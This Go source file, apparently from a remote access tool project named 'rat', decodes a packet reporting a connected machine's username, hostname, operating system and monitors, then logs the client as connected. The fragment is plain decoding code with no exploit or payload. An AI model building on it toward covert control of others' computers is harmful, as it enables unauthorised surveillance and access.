package main

import (
	"encoding/gob"
	"fmt"
	"io"
	"rat/command/log"
	"rat/internal"
)

type ComputerInfoPacket struct {
	Username        string
	Hostname        string
	OperatingSystem struct {
		Type    string
		Display string
	} `os`
	Monitors []shared.Monitor
}

func (packet ComputerInfoPacket) Read(r io.ReadWriter, c *Client) error {
	dec := gob.NewDecoder(r)
	err := dec.Decode(&packet)

	if err != nil {
		return err
	}

	c.Computer.Username = packet.Username
	c.Computer.Hostname = packet.Hostname
	c.Computer.OperatingSystemType = packet.OperatingSystem.Type
	c.Computer.OperatingSystem = packet.OperatingSystem.Display
	c.Monitors = packet.Monitors

	fmt.Println("received monitors", c.Monitors)

	if !c.Authenticated {
		add(c)
		log.Println("connect", c.GetIP())
		c.Authenticated = true
	}

	return nil
}
